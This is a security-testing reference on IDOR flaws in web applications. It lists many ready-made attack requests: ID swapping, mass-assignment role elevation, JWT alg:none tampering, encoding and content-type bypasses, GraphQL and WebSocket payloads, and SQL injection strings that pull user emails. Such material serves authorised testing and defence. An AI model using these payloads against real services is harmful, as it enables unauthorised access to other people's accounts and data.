# IDOR — Insecure Direct Object Reference

## Overview

Insecure Direct Object Reference (IDOR) occurs when an application exposes internal
object identifiers (IDs, keys, filenames) and fails to verify that the requester has
permission to access the referenced object. It is the most common form of Broken Access
Control — OWASP #1 in both 2021 and 2025.

**Distinction:**
- **Horizontal escalation** — user A accesses user B's resources (same privilege level)
- **Vertical escalation** — low-privilege user accesses admin or elevated-privilege resources

**Impact:** Data exfiltration, account takeover, unauthorized modification or deletion,
financial fraud, PII exposure.

**Sources:**
- OWASP Top 10 A01:2021 — Broken Access Control
- PortSwigger Web Security Academy — Access control vulnerabilities
- HackerOne Hacktivity — Shopify IDOR ($25,000+), Twitter IDOR, multiple API IDOR reports

---

## Direct Object Reference Patterns

### Sequential Integers (Most Common)

```
GET /api/users/1001/profile
GET /api/orders/54321
GET /invoices/download?id=9982
GET /documents/3847/view

# Test: increment/decrement by 1, jump to low numbers (1, 2, 100)
GET /api/users/1000/profile   ← attacker's account
GET /api/users/1001/profile   ← victim (IDOR)
```

### GUIDs / UUIDs

```
GET /api/reports/550e8400-e29b-41d4-a716-446655440000

# UUID v1 is time-based and partially predictable
# UUID v4 is random — usually safe, but:
#   - May be leaked in other responses (email headers, logs exposed via info disclosure)
#   - May be guessable if seeded with low entropy
#   - Try enumerating GUIDs found in JS source, API responses, emails

# UUID v1 timestamp extraction:
python3 -c "import uuid; u=uuid.UUID('550e8400-e29b-11d4-a716-446655440000'); print(u.time)"
```

### Predictable Hashes

```
# MD5 of email — common pattern for "unsubscribe" or "avatar" links
https://target.com/avatar/d41d8cd98f00b204e9800998ecf8427e   # MD5 of ""
https://target.com/unsubscribe/5f4dcc3b5aa765d61d8327deb882cf99  # MD5 of "password"

# Brute-force with known email list:
import hashlib
emails = ['user@example.com', 'admin@target.com']
for e in emails:
    print(hashlib.md5(e.encode()).hexdigest(), e)
```

### Base64-Encoded IDs

```
# Decode, modify, re-encode
eyJ1c2VySWQiOiAxMDAxfQ==  →  {"userId": 1001}  →  {"userId": 1002}  →  eyJ1c2VySWQiOiAxMDAyfQ==

# Common decode targets
echo "eyJ1c2VySWQiOiAxMDAxfQ==" | base64 -d
# → {"userId": 1001}

# Re-encode modified value
echo -n '{"userId": 1002}' | base64
```

### Compound Keys and Indirect References

```
# Object referenced by combination of fields
GET /api/messages?from=1001&to=1002

# Indirect reference via association
GET /api/user/settings        ← user ID inferred from session
POST /api/transfer { "to_account": "ACC-9982" }   ← account number is the IDOR

# Filename-based
GET /files/2024/user_export_john_smith.csv
GET /reports/Q4_finance_internal.xlsx
```

---

## Horizontal Privilege Escalation

User A accesses or modifies resources belonging to User B at the same privilege level.

### Classic Examples

```http
# Access another user's profile
GET /api/users/1002/profile HTTP/1.1
Authorization: Bearer <User-A-Token>

# Download another user's invoice
GET /invoices/download?invoice_id=88821
Authorization: Bearer <User-A-Token>

# Read another user's messages
GET /api/conversations/9920/messages
Authorization: Bearer <User-A-Token>

# Edit another user's shipping address
PUT /api/addresses/44123
{"street": "Attacker St"}
Authorization: Bearer <User-A-Token>

# Access another user's OAuth tokens / connected apps
GET /api/users/1002/connected_accounts
```

### Two-Account Testing Procedure

```
1. Create Account A and Account B (different emails/sessions)
2. With Account A: create objects, note all IDs returned (orders, profiles, files, etc.)
3. With Account B: attempt to access Account A's object IDs
4. Record HTTP status (200 = IDOR, 403 = properly protected, 404 = obscured)
5. Repeat for every CRUD operation: GET, PUT/PATCH, DELETE, POST (to add associations)
```

---

## Vertical Privilege Escalation

A lower-privilege user accesses functionality or data restricted to higher roles.

### Parameter Tampering for Role Elevation

```http
# Account creation — try adding role field
POST /api/register
{"email": "a@evil.com", "password": "...", "role": "admin"}

# Profile update — mass assignment injection
PUT /api/users/1001
{"name": "Attacker", "role": "admin", "is_admin": true, "plan": "enterprise"}

# API call with undocumented admin parameter
GET /api/users?admin=true
GET /api/reports?include_all_users=true
DELETE /api/users/1001?force=true
```

### Accessing Admin Endpoints Directly

```
GET /admin/users
GET /admin/dashboard
GET /api/admin/logs
POST /api/admin/impersonate
GET /management/users
GET /internal/metrics

# Try with unprivileged session token — if no server-side role check, returns data
```

### Forced Browsing to Privileged Objects

```
# Typical pattern: app renders admin links only in UI, but no server-side check
GET /reports/all_users_export.csv    ← linked only in admin panel
GET /api/audit_log?all=true
GET /billing/summary?org=all
```

---

## Mass Assignment

Frameworks that auto-bind request body fields to model attributes allow injection of
privileged properties if not explicitly allowlisted.

### Common Vulnerable Attributes

```json
{
  "role": "admin",
  "is_admin": true,
  "is_verified": true,
  "email_verified": true,
  "balance": 99999,
  "credits": 9999,
  "plan": "enterprise",
  "subscription": "premium",
  "account_type": "staff",
  "permissions": ["read", "write", "admin"],
  "bypass_2fa": true
}
```

### Framework-Specific Notes

```ruby
# Rails — vulnerable pattern (params without strong parameters)
def create
  @user = User.new(params[:user])   # mass assignment vulnerability

# Safe (strong parameters)
def user_params
  params.require(:user).permit(:name, :email, :password)
end
```

```python
# Django REST Framework — vulnerable serializer
class UserSerializer(serializers.ModelSerializer):
    class Meta:
        model = User
        fields = '__all__'   # exposes all fields including is_staff, is_superuser

# Safe
fields = ['id', 'username', 'email']
```

```javascript
// Express + Mongoose — vulnerable
router.put('/user/:id', async (req, res) => {
  await User.findByIdAndUpdate(req.params.id, req.body);  // mass assignment
});

// Safe
const allowed = { name: req.body.name, email: req.body.email };
await User.findByIdAndUpdate(req.params.id, allowed);
```

---

## IDOR in REST APIs

### Parameter Location Coverage

```
# Path parameter
GET /api/v1/users/1001/orders

# Query string
GET /api/orders?user_id=1001&page=1

# Request body
POST /api/messages/send
{"recipient_id": 1002, "message": "hello"}

# Header
X-User-ID: 1001
X-Account-ID: ACC-9982

# Cookie
user_session=eyJ1c2VySWQiOiAxMDAxfQ==   ← contains userId, modify to 1002
```

### HTTP Method Testing

```http
# Try all methods on every endpoint even if only one is documented
GET    /api/users/1002   ← read
POST   /api/users/1002   ← create/trigger action
PUT    /api/users/1002   ← replace
PATCH  /api/users/1002   ← partial update
DELETE /api/users/1002   ← delete

# Also try:
HEAD   /api/users/1002   ← metadata leak
OPTIONS /api/users/1002  ← reveals allowed methods
```

### JWT Sub Claim Manipulation

```
# Decode JWT payload (middle section, base64)
eyJzdWIiOiAxMDAxLCAicm9sZSI6ICJ1c2VyIn0=
→ {"sub": 1001, "role": "user"}

# If server doesn't properly verify signature or trusts sub blindly:
# Modify sub to 1002, re-encode (alg:none attack or weak secret brute-force)
# Tools: jwt_tool, jwt.io

python3 jwt_tool.py <token> -T    # tamper mode
python3 jwt_tool.py <token> -X a  # alg:none attack
```

---

## IDOR in GraphQL

### Direct ID Arguments

```graphql
# Query another user's data by changing the id argument
query {
  user(id: 1002) {
    email
    phoneNumber
    paymentMethods {
      cardNumber
      expiry
    }
  }
}
```

### Introspection-Based Discovery

```graphql
# Enumerate all types and fields to find IDOR opportunities
query {
  __schema {
    types {
      name
      fields {
        name
        type { name }
      }
    }
  }
}

# Then test every query/mutation that accepts an id/userId/objectId argument
```

### Query Aliasing for Mass Enumeration

```graphql
# Fetch multiple users in one request using aliases
query {
  user1: user(id: 1001) { email }
  user2: user(id: 1002) { email }
  user3: user(id: 1003) { email }
  user4: user(id: 1004) { email }
}
```

### Mutation IDOR

```graphql
# Modify another user's object via mutation
mutation {
  updateUserProfile(userId: 1002, input: {
    email: "attacker@evil.com"
  }) {
    success
    user { email }
  }
}

# Delete another user's resource
mutation {
  deleteDocument(documentId: "DOC-9982") {
    success
  }
}
```

---

## Chaining IDOR with Other Vulnerabilities

### IDOR + Info Disclosure → Targeted Attack

```
1. IDOR on /api/users/{id} leaks email + phone
2. Use leaked PII for spear phishing or SIM swap
3. Bypass 2FA → full account takeover
```

### IDOR + Stored XSS → ATO

```
1. IDOR allows writing to another user's profile fields (PUT /api/users/1002)
2. Inject stored XSS payload into bio/name field
3. When admin reviews the profile → XSS fires in admin context → admin ATO
```

### IDOR + SSRF → Internal Pivot

```
1. IDOR on webhook configuration endpoint (PUT /api/webhooks/9982)
   → change webhook URL to attacker-controlled target or internal IP
2. Trigger the webhook → SSRF via legitimate-looking webhook delivery
3. Reach internal services via victim's webhook mechanism
```

### IDOR in Password Reset → ATO

```
1. Password reset generates token linked to user ID
2. IDOR: request reset for user A, intercept token, send reset for user B
   (if token is stored server-side without tying it to the requesting session)
3. Or: reset link endpoint /reset?token=X&user_id=1002 — swap user_id

Example flow:
POST /api/password/reset {"email": "victim@target.com"}
→ Token generated for user_id=1002

GET /reset?token=abc123&user_id=1002  ← attacker intercepts, changes 1002 to 1001
```

### IDOR + Race Condition

```
# Some apps check permission then act — race between check and action
1. Initiate a transfer for your own account
2. Race condition: before server validates, swap account_id in request
3. Transfer executes against target account

# Tools: Turbo Intruder, Burp Suite Repeater with parallel requests
```

---

## Testing Methodology

### Setup

```
1. Create two standard user accounts (Account A and Account B)
2. For privileged endpoint testing, also create one admin account if self-registration allows role selection
3. Capture all traffic with Burp Suite proxy
4. Build a sitemap of all endpoints and parameters using Spider + manual browsing
```

### Systematic Testing Steps

```
1. Map all IDs/references visible to Account A (object IDs, file IDs, report IDs)
2. Log in as Account B, attempt to access every ID from Account A's session
3. For each endpoint: test GET, PUT, PATCH, DELETE, POST with swapped IDs
4. Check request body, query params, path params, and headers for ID parameters
5. Test endpoints with no auth header at all → some endpoints have no auth check
6. Try deleted/deactivated object IDs → may bypass access controls if objects not fully removed
7. Test export and download endpoints — these are high-value and often overlooked
8. Test batch/bulk operations: {"ids": [1001, 1002, 1003]} → may return all if one belongs to you
9. Check pagination/listing endpoints for data leakage across users
10. Test state-change operations: mark as read, archive, delete — may affect other users' items
```

### Response Interpretation

```
200 OK + data from Account A → confirmed IDOR
200 OK + Account B's own data (no cross-access) → properly scoped
401 Unauthorized → no auth token was included (check your request)
403 Forbidden → server checked authorization, properly protected
404 Not Found → may be obscured IDOR (object exists but returns 404 to non-owners)
500 Internal Server Error → may indicate access reached the object but crashed — investigate further
```

---

## Common Endpoints and Parameters to Test

| Endpoint Pattern | Parameter | Notes |
|-----------------|-----------|-------|
| `/api/users/{id}` | path id | Profile data, PII |
| `/api/users/{id}/settings` | path id | 2FA, notification prefs |
| `/api/orders/{orderId}` | path id | Purchase history |
| `/api/invoices/{id}` | path id | Financial data |
| `/invoices/download?id=` | query id | File download |
| `/api/messages/{id}` | path id | Private messages |
| `/api/documents/{id}` | path id | Uploaded files |
| `/api/payment_methods/{id}` | path id | Card data |
| `/api/addresses/{id}` | path id | Personal info |
| `/api/admin/users` | — | Admin-only listing |
| `/api/reports/export` | `user_id`, `org_id` | Bulk data export |
| `/api/referrals/{code}` | path code | Referral credit manipulation |
| `/api/tokens/{id}/revoke` | path id | Revoke another user's session |
| `/api/tickets/{id}` | path id | Support ticket contents |
| `/api/webhooks/{id}` | path id | Webhook URL/secret |
| `/api/team/members/{id}` | path id | Team management |
| `/api/subscriptions/{id}` | path id | Billing plan |

---

## Detection Notes

- IDOR is authorization, not authentication — always include a valid auth token (just not the owner's)
- Low-severity IDOR (read-only, non-sensitive) → still reportable; focus on sensitive data or write-access for higher impact
- Use Burp's Autorize extension to automate IDOR testing across all requests with a second user's session cookie
- Check JavaScript source for hardcoded endpoints and object ID patterns not visible in normal app flow
- Test mobile app API traffic — mobile apps often expose undocumented API endpoints with weaker access control
- IDOR in admin panel → always higher severity, often leads to full platform compromise

---

## Advanced Patterns

### API Versioning Bypass

A very common pattern: developers add authorization checks to the new API version but
forget to deprecate or protect the old one.

```http
# v2 properly checks ownership:
GET /api/v2/users/1002/documents → 403 Forbidden

# v1 has no authorization check:
GET /api/v1/users/1002/documents → 200 OK (all documents returned)

# Also try:
GET /api/v0/users/1002/documents
GET /api/internal/users/1002/documents
GET /api/legacy/users/1002/documents
GET /api/mobile/users/1002/documents  # Mobile API endpoint often less hardened

# Common discovery: check JS bundles for old API paths,
# check Wayback Machine for deprecated endpoints
```

### State Machine / Workflow IDOR

Some objects can only be accessed in certain states. Skipping workflow steps via IDOR
allows accessing objects outside their intended state.

```http
# Normal flow: draft → submitted → approved → published
# IDOR: jump from draft directly to published state

# Step 1: Create draft (returns id=555)
POST /api/documents {"title": "test", "status": "draft"}
→ {"id": 555, "status": "draft"}

# Step 2: Skip approval — directly access another user's approved document:
GET /api/documents/approved/333   ← not your document, wrong state

# Step 3: Directly update state of another user's document:
PUT /api/documents/333/status {"status": "published"}
```

### Async Job / Export Queue IDOR

Background job IDs are often sequential and accessible before authorization is checked.

```http
# Trigger an export for your account:
POST /api/exports {"type": "user_data"}
→ {"job_id": "job_4521", "status": "pending"}

# Poll another user's job ID (sequential):
GET /api/exports/job_4520/status   ← someone else's export
GET /api/exports/job_4520/download ← download their data

# Common targets: data export, PDF generation, report scheduling, CSV download
```

### Tenant Isolation Failure (SaaS Multi-Tenancy)

```http
# Single-tenant API — user ID is scoped to tenant via JWT
# IDOR: modify org_id or tenant_id parameter to access another company's data

GET /api/org/tenant-abc/users HTTP/1.1
Authorization: Bearer <token for tenant-xyz>
→ If server doesn't validate token's org matches path param → data breach

# Also test:
POST /api/reports {"org_id": "target-tenant", "type": "all_users"}
GET /api/settings?company_id=competitor-org-id

# Header-based tenant confusion:
X-Tenant-ID: other-tenant
X-Organization-ID: other-org
```

### IDOR in 2FA / Backup Codes

```http
# 2FA backup codes often stored with user_id reference
GET /api/users/1002/2fa/backup-codes   ← another user's backup codes

# Reset another user's 2FA:
DELETE /api/users/1002/2fa
POST /api/users/1002/2fa/reset

# View another user's active sessions:
GET /api/users/1002/sessions

# Revoke another user's specific session:
DELETE /api/sessions/sess_abc123   ← session ID from IDOR in session listing
```

### Object-Level vs Field-Level IDOR

Object-level IDOR (full object access) is commonly tested. Field-level is often missed.

```http
# Object-level (commonly tested):
GET /api/users/1002 → returns all fields

# Field-level (often missed): object is your own, but field should be hidden
GET /api/users/1001    ← your own account
{
  "id": 1001,
  "email": "you@example.com",
  "salary": 95000,         ← should not be visible to self
  "internal_score": 82,   ← admin-only field returned to user
  "password_hash": "..."  ← should never be returned
}

# Test: compare fields returned to regular user vs admin
# Use Burp Comparer on two responses
```

### IDOR via HTTP Parameter Pollution

```http
# Some frameworks use first or last occurrence of a duplicate param
# Inject second user_id alongside your own to confuse server

GET /api/documents?user_id=1001&user_id=1002
# → If server uses last value: returns user 1002's documents
# → If server uses first value: returns user 1001's documents

# Works in: PHP ($_GET last value wins), Node (Express uses array or last),
#           Java (first value wins), ASP.NET (comma-joins values)

POST /api/transfer
user_id=1001&amount=100&user_id=1002
```

### Wildcard Parameter Injection

## Wildcard Parameter Injection
**Reference type:** Wildcard character  
**API pattern:** REST  
**Authorization flaw:** Backend processes `*`, `%`, `_`, or `.` as universal matchers and returns all records instead of rejecting the request; no ownership check is reached because the wildcard matches everything before auth logic fires.  
**Escalation:** Horizontal (mass enumeration)  
**Business impact:** Full user database or file listing exposed in a single request  
**Test payload:**
```http
GET /api/users/* HTTP/1.1
GET /api/users/%
GET /api/users/_
GET /api/files/.
GET /api/orders/*/details
Authorization: Bearer <any-valid-token>
```
**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References

---

## Content-Type Switching IDOR Bypass
**Reference type:** Any (numeric/GUID/hash)  
**API pattern:** REST  
**Authorization flaw:** Access control middleware is applied only to one content type (typically `application/json`). Switching to `application/xml`, `text/plain`, or `application/x-www-form-urlencoded` routes the request through a different handler or parser that skips the ACL check.  
**Escalation:** Horizontal / Vertical  
**Business impact:** Unauthorized read or write access to any object by evading content-type-specific authorization  
**Test payload:**
```http
# Original (blocked):
POST /api/users/1002/data HTTP/1.1
Content-Type: application/json
{"action": "read"}

# Bypass attempt 1 — switch to XML:
POST /api/users/1002/data HTTP/1.1
Content-Type: application/xml
<action>read</action>

# Bypass attempt 2 — switch to form-encoded:
POST /api/users/1002/data HTTP/1.1
Content-Type: application/x-www-form-urlencoded
action=read

# Bypass attempt 3 — text/plain (some frameworks skip validation):
POST /api/users/1002/data HTTP/1.1
Content-Type: text/plain
{"action": "read"}
```
**Source:** https://github.com/KathanP19/HowToHunt/blob/master/IDOR/IDOR.md

---

## Array Wrapping (Type Coercion IDOR)
**Reference type:** Numeric ID  
**API pattern:** REST (JSON body)  
**Authorization flaw:** Server-side authorization validates that a scalar `id` field belongs to the session user, but when the same value arrives as a single-element array the type check is bypassed — the framework either coerces it to a scalar silently or the ACL comparison evaluates to true before unpacking.  
**Escalation:** Horizontal  
**Business impact:** Access to any resource by sending `{"id":[victim_id]}` instead of `{"id": victim_id}`  
**Test payload:**
```http
# Original (blocked):
POST /api/documents/view HTTP/1.1
Content-Type: application/json
{"id": 1002}

# Bypass — wrap in array:
{"id": [1002]}

# Also try:
{"id": [1002, 1003, 1004]}   ← may return batch of other users' objects
{"user_id": [42]}
{"invoice_id": [88821]}

# JSON number → string coercion variant:
{"id": "1002"}   ← integer check skipped if server accepts strings
{"id": "1002.0"} ← floating point coercion
```
**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References

---

## File Extension Appending
**Reference type:** Path-based (filename / numeric)  
**API pattern:** REST  
**Authorization flaw:** Access control is applied to the base route (`/user_data/2341`) but the framework routes requests with appended extensions (`.json`, `.xml`, `.csv`) to a different controller or serializer that has no ACL middleware. Common in Rails, Laravel, and Express with route globbing.  
**Escalation:** Horizontal  
**Business impact:** Unauthorized access to another user's data by requesting an alternate serialized representation of the same object  
**Test payload:**
```http
# Original (blocked):
GET /api/user_data/2341 HTTP/1.1
→ 403 Forbidden

# Extension bypass:
GET /api/user_data/2341.json HTTP/1.1
GET /api/user_data/2341.xml HTTP/1.1
GET /api/user_data/2341.csv HTTP/1.1
GET /api/user_data/2341.html HTTP/1.1

# Also try on file download endpoints:
GET /invoices/88821.pdf HTTP/1.1   ← if /invoices/88821 returned 403
```
**Source:** https://github.com/KathanP19/HowToHunt/blob/master/IDOR/IDOR.md

---

## Parameter Name Substitution
**Reference type:** Numeric ID  
**API pattern:** REST  
**Authorization flaw:** The backend accepts multiple parameter names for the same underlying object (e.g., `album_id` and `collection_id` both map to the photo album table). The authorization check validates only the canonical parameter name; substituting an alias bypasses the check while still accessing the same object.  
**Escalation:** Horizontal / Vertical  
**Business impact:** Unauthorized access to objects via undocumented or aliased parameter names that lack authorization enforcement  
**Test payload:**
```http
# Discover the canonical param from normal app flow, then substitute:
# Canonical (blocked):
GET /api/photos?album_id=9982
→ 403 Forbidden

# Substitute aliases:
GET /api/photos?collection_id=9982
GET /api/photos?folder_id=9982
GET /api/photos?gallery_id=9982
GET /api/photos?id=9982

# In request body — try alternate names:
POST /api/messages/get
{"thread_id": 5001}      ← blocked
{"conversation_id": 5001} ← alias, may lack ACL

# Also: swap object-type prefix
GET /api/data?user_id=1002  → try GET /api/data?account_id=1002
```
**Source:** https://github.com/KathanP19/HowToHunt/blob/master/IDOR/IDOR.md

---

## WebSocket IDOR
**Reference type:** Numeric / GUID  
**API pattern:** WebSocket  
**Authorization flaw:** WebSocket connections authenticate at the handshake (HTTP Upgrade request) but perform no per-message object-level authorization. Once connected, resource IDs sent in message payloads are processed without verifying the connected user owns the referenced object.  
**Escalation:** Horizontal / Vertical  
**Business impact:** Real-time access to private data streams, chat messages, notifications, or live dashboards belonging to other users  
**Test payload:**
```
# Step 1: Establish WebSocket connection (auth happens here via cookie/token)
GET /ws HTTP/1.1
Upgrade: websocket
Connection: Upgrade
Cookie: session=<your-session>

# Step 2: After connection, send message with another user's object ID
# Burp Suite: Proxy → WebSocket history → intercept and modify

# Subscribe to another user's notification stream:
{"action": "subscribe", "channel": "user_notifications", "user_id": 1002}

# Request another user's chat room:
{"type": "join_room", "room_id": "private_room_9982"}

# Fetch another user's live dashboard data:
{"event": "get_dashboard", "account_id": "ACC-1002"}

# Read another user's messages in real-time:
{"cmd": "fetch_messages", "conversation_id": 5001, "user_id": 1002}

# Tool: Burp Suite WebSocket tab, wscat for manual testing
# wscat -c wss://target.com/ws --header "Cookie: session=<yours>"
```
**Source:** https://portswigger.net/web-security/websockets

---

## GraphQL Subscription IDOR
**Reference type:** Numeric / GUID  
**API pattern:** GraphQL (Subscription over WebSocket)  
**Authorization flaw:** GraphQL subscription resolvers are implemented separately from query/mutation resolvers. Teams add ownership checks to queries and mutations but forget subscription resolvers — any authenticated user can subscribe to another user's event stream by supplying their `userId` or `objectId` argument.  
**Escalation:** Horizontal  
**Business impact:** Real-time exfiltration of another user's private events, order status, messages, or financial transactions  
**Test payload:**
```graphql
# Subscribe to another user's order updates:
subscription {
  orderUpdated(userId: "1002") {
    orderId
    status
    total
    shippingAddress { street city zip }
  }
}

# Subscribe to another user's notifications:
subscription {
  newNotification(userId: "1002") {
    message
    type
    timestamp
  }
}

# Subscribe to another user's chat messages:
subscription {
  messageReceived(conversationId: "conv_9982") {
    content
    sender { id email }
    sentAt
  }
}

# Discover subscriptions via introspection:
query {
  __schema {
    subscriptionType {
      fields { name args { name type { name } } }
    }
  }
}
```
**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References

---

## Pre-Signed Object Storage IDOR
**Reference type:** Filename / object key  
**API pattern:** REST (AWS S3, GCS, Azure Blob Storage)  
**Authorization flaw:** The API endpoint that *generates* a pre-signed URL checks only that the requester is authenticated, not that they own the requested object key. Any authenticated user can request a time-limited signed URL for any object key in the bucket, including files belonging to other users.  
**Escalation:** Horizontal  
**Business impact:** Access to private files, documents, medical records, financial exports, or user attachments stored in cloud object storage  
**Test payload:**
```http
# Step 1: Request a pre-signed URL for your own file (observe the object key pattern):
POST /api/files/presign HTTP/1.1
{"key": "uploads/user_1001/invoice_jan2026.pdf"}
→ {"url": "https://bucket.s3.amazonaws.com/uploads/user_1001/invoice_jan2026.pdf?X-Amz-Signature=..."}

# Step 2: Request a signed URL for another user's object key:
POST /api/files/presign HTTP/1.1
{"key": "uploads/user_1002/invoice_jan2026.pdf"}
→ If server returns a signed URL → IDOR confirmed

# Step 3: Fetch the file directly using the signed URL (no further auth needed)
GET https://bucket.s3.amazonaws.com/uploads/user_1002/invoice_jan2026.pdf?X-Amz-Signature=...

# Variations:
POST /api/download {"filename": "user_1002/export_2026.csv"}
GET /api/attachments/presign?key=tickets/ticket_9982/attachment.docx
POST /api/avatar/upload-url {"userId": 1002}   ← write IDOR via presign
```
**Source:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References

---

## GraphQL-WS Hidden Operations IDOR
**Reference type:** Numeric (high-entropy or standard)
**API pattern:** GraphQL (graphql-ws protocol over WebSocket)
**Authorization flaw:** The `/graphql-ws` WebSocket endpoint supports GraphQL operations not exposed in the public schema or API docs. These hidden operations — discoverable only by analyzing client-side JavaScript bundles — lack ownership validation on object ID arguments. The endpoint authenticates at the WebSocket handshake level but never checks whether the requested object belongs to the connected user. When IDs have high entropy (preventing brute-force enumeration), the same ID parameter is often SQL-injectable, bypassing the entropy protection entirely.
**Escalation:** Horizontal
**Business impact:** Unauthorized read or write access to private structured data (legal documents, records, contracts) for any user. Chains with SQL injection to bypass high-entropy ID protections → full PII exfiltration.
**Test payload:**
```
# Step 1: Find /graphql-ws in Burp WebSocket history or Burp target map
# Step 2: Search JS bundle for operation names not in public schema:
#   grep -E "(query|mutation|subscription)\s+\w+" main.js

# Step 3: Establish connection (auth happens here):
{"type": "connection_init", "payload": {"authorization": "Bearer <your-token>"}}
# → Receive: {"type": "connection_ack"}

# Step 4: Invoke hidden operation with your own ID first (confirm it works):
{"id":"1","type":"start","payload":{"query":"query { document(id: \"YOUR_DOC_ID\") { content owner } }"}}

# Step 5: Swap to another user's ID — if returned → IDOR confirmed
{"id":"2","type":"start","payload":{"query":"query { document(id: \"VICTIM_DOC_ID\") { content owner } }"}}

# Step 6: If IDs are high-entropy (25-digit numeric), try SQL injection in same param:
{"id":"3","type":"start","payload":{"query":"query { document(id: \"1 OR 1=1 LIMIT 1--\") { content } }"}}
# Error-based PostgreSQL exfil:
{"id":"4","type":"start","payload":{"query":"query { document(id: \"1 AND CAST((SELECT email FROM users LIMIT 1) AS INT)--\") { content } }"}}
# → Error message leaks PII: 'invalid input syntax for integer: "victim@corp.com"'

# Tools: Burp Suite WebSocket tab, wscat
# wscat -c wss://target.com/graphql-ws --header "Authorization: Bearer <yours>"
```
**Source:** https://medium.com/@DarkyOS/sql-injection-in-graphql-websocket-escalated-to-pii-document-leak-09ba7ad2800a

---

## Unauthenticated GraphQL Object Access
**Reference type:** Numeric / GUID
**API pattern:** GraphQL
**Authorization flaw:** The GraphQL endpoint is exposed without any authentication requirement — no token, cookie, or session is checked. Object ID arguments in queries allow enumeration of any user's data, including admin profiles, roles, and PII. Introduced when developers leave `/graphql` or `/api/graphql` open for development tooling and never add an auth gate before production deployment.
**Escalation:** Vertical (admin and all-user data accessible to unauthenticated callers)
**Business impact:** Full enumeration of admin accounts, emails, roles, and internal user records without credentials. Enables targeted attacks against platform administrators with zero prior access.
**Test payload:**
```http
# Test with NO Authorization header and NO session cookie:
POST /graphql HTTP/1.1
Host: target.com
Content-Type: application/json

{"query": "{ users(role: \"admin\") { id email role phone twoFactorEnabled } }"}

# Enumerate user IDs:
{"query": "{ user(id: 1) { id email role isAdmin } }"}
{"query": "{ user(id: 2) { id email role isAdmin } }"}

# Check if introspection is open (indicator of no auth gate):
{"query": "{ __schema { types { name } } }"}

# List all users:
{"query": "{ allUsers { id email role createdAt lastLogin } }"}

# Detection signal: any data returned without an Authorization header = confirmed
```
**Source:** https://medium.com/@yasser0hamoda1/unauthenticated-admin-profile-disclosure-via-graphql-idor-a-real-world-bug-bounty-find-f8647eae5237

---

## Scheduled Recurring Job IDOR
**Reference type:** Numeric / UUID (`projectId`, `jobId`)
**API pattern:** REST
**Authorization flaw:** APIs managing scheduled/recurring data pipeline jobs scope access by a `projectId` or `jobId` parameter. The server validates that the requester is authenticated but never checks that the referenced project belongs to the authenticated user's organization. Sequential or auto-incremented project IDs allow direct cross-tenant enumeration.
**Escalation:** Horizontal / Tenant isolation
**Business impact:** Access to another organization's scheduled export configs, pipeline connection strings, credentials, and output data. Highest impact in analytics, BI, and ETL SaaS platforms where scheduled jobs routinely contain database credentials or sensitive business data.
**Test payload:**
```http
# Observe your own project ID from normal app usage:
GET /api/v1/schedules?projectId=PRJ-1042 HTTP/1.1
Authorization: Bearer <your-token>
→ 200 OK, your scheduled jobs

# Enumerate adjacent project IDs:
GET /api/v1/schedules?projectId=PRJ-1041 HTTP/1.1
Authorization: Bearer <your-token>
→ If 200 OK with another org's jobs → IDOR confirmed

# Additional patterns to test:
GET /api/projects/1041/scheduled-exports HTTP/1.1
GET /api/schedules/job_4521/results HTTP/1.1           ← another org's job output
GET /api/pipelines?project_id=1041 HTTP/1.1
PATCH /api/schedules/job_4521 {"enabled": false}       ← disable another org's job
DELETE /api/schedules/job_4521                         ← delete another org's schedule

# Note: auto-incremented numeric project IDs (1041, 1042, 1043...) are directly
# enumerable with Burp Intruder; UUID-based project IDs may be leaked in API responses
```
**Source:** https://hackerone.com/reports/3219944

---

## Hex-Encoded Numeric ID Bypass
**Reference type:** Numeric (hexadecimal representation)
**API pattern:** REST
**Authorization flaw:** Access control validates the object ID only as a decimal integer. The backend database or ORM accepts hexadecimal representations of the same integer transparently. When the ACL check receives `0x4642d` it fails a strict numeric equality check (`id === 287789`) or regex (`^\d+$`) and skips authorization — the query layer then converts the hex to decimal and fetches the object.
**Escalation:** Horizontal
**Business impact:** Any numeric-ID-protected object accessible to any authenticated user by supplying its hex equivalent, bypassing integer-format ACL guards.
**Test payload:**
```http
# Normal request (blocked by ACL):
GET /api/users/287789/profile HTTP/1.1
Authorization: Bearer <your-token>
→ 403 Forbidden

# Hex bypass:
GET /api/users/0x4642d/profile HTTP/1.1
Authorization: Bearer <your-token>
→ 200 OK (same object, ACL skipped)

# Also try:
GET /api/orders/0x4642e HTTP/1.1          ← next sequential object
GET /api/invoices/0x00044333 HTTP/1.1     ← zero-padded hex
GET /api/documents/0X4642D HTTP/1.1      ← uppercase X variant

# Convert between decimal and hex:
python3 -c "print(hex(287789))"   # → 0x4642d
python3 -c "print(int('0x4642d', 16))"  # → 287789

# Burp Intruder: use 'Numbers' payload type in Hex format, step through range
# Payload type: Numbers → Format: Hex → From: 0x44000 To: 0x45000 Step: 1
```
**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References

---

## Unix Timestamp Object ID Enumeration
**Reference type:** Numeric (Unix epoch timestamp)
**API pattern:** REST
**Authorization flaw:** Object IDs are set to the Unix timestamp of creation time rather than a random value. Timestamps are deterministic and predictable — any authenticated user who knows the approximate creation window of another user's object can enumerate every possible ID within that window by iterating seconds/milliseconds. No ownership check prevents fetching objects by timestamp ID.
**Escalation:** Horizontal
**Business impact:** Any object created within a guessable time window is fully enumerable. Particularly impactful for password reset tokens, session IDs, document exports, or payment records stored with timestamp-based IDs.
**Test payload:**
```http
# Observe timestamp-based ID from your own object:
POST /api/documents {"title": "test"}
→ {"id": 1695574808, "title": "test", "created_at": "2023-09-24T12:00:08Z"}
# id = Unix timestamp of creation

# Enumerate all documents created within a time window:
GET /api/documents/1695574800 HTTP/1.1   ← 8 seconds before yours
GET /api/documents/1695574801 HTTP/1.1
GET /api/documents/1695574802 HTTP/1.1
...
GET /api/documents/1695574900 HTTP/1.1   ← 92 seconds of enumeration covers full minute

# Convert target time window to Unix timestamps:
python3 -c "import datetime; print(int(datetime.datetime(2023,9,24,12,0,0).timestamp()))"
# → 1695574800

# Burp Intruder sweep:
# Payload: Numbers → From: 1695574800 To: 1695575400 Step: 1 (600 requests = 10 min window)

